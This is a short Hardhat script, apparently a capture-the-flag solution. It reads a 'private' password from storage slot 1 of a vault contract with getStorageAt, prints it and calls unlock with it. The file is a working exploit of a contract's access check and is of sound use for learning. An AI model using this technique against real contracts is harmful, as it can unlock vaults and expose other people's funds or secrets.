const path = require('path');
const addresses = require('../Addresses.json');

async function main() {
    const scriptName = path.basename(__filename, '.js');
    console.log('----------', scriptName, '----------')

    const accounts = await ethers.getSigners();
    const sender = accounts[0];

    const vaultAddress = addresses[scriptName];
    const vaultContract = await ethers.getContractAt("IVault", vaultAddress);

    let password = (await ethers.provider.getStorageAt(vaultAddress, 1))

    console.log(password)

    const txUnlock = await vaultContract.unlock(password);

    console.log('----------End----------');
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });
  